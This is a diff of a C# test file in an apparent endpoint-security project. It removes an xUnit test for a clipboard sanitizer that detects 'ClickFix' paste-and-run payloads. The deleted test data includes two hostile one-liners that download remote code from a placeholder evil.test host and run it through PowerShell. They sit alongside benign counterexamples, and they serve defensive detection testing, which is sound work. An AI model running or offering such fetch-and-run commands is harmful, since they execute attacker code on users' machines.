@@ -100,16 +100,6 @@ namespace Sentinel.Tests
                 "Expected kill budget rate-limit evidence. Log:\n" + text);
         }
 
-        [Theory]
-        [InlineData("powershell -w h -c \"iex (irm https://evil.test/a)\"", true)]
-        [InlineData("cmd /c curl https://evil.test/x | powershell -", true)]
-        [InlineData("https://google.com/search?q=hello", false)]
-        [InlineData("Meeting notes for tomorrow", false)]
-        public void ClipboardSanitizer_DetectsClickFixPayloads(string text, bool expected)
-        {
-            Assert.Equal(expected, ClipboardSanitizer.LooksLikeClickFixPayload(text));
-        }
-
         [Fact]
         public void ClickFixDetectionRule_CatchesExplorerPowerShellIwr()
         {
